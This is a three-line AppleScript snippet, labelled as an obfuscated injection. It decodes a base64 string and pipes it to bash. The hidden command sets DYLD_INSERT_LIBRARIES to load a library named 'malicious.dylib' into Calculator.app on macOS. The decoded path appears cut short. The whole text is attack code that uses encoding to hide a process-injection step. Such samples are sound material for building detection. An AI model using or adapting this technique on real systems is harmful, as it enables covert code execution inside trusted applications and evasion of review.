-- Obfuscated injection using base64
set b64 to "RFlMRF9JTlNFUlRfTElCUkFSSUVTPS9Vc2Vycy9TaGFyZWQvbWFsaWNpb3VzLmR5bGliIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwL0NvbnRlbnRzL01hY09T"
do shell script "echo " & b64 & " | base64 -D | bash"
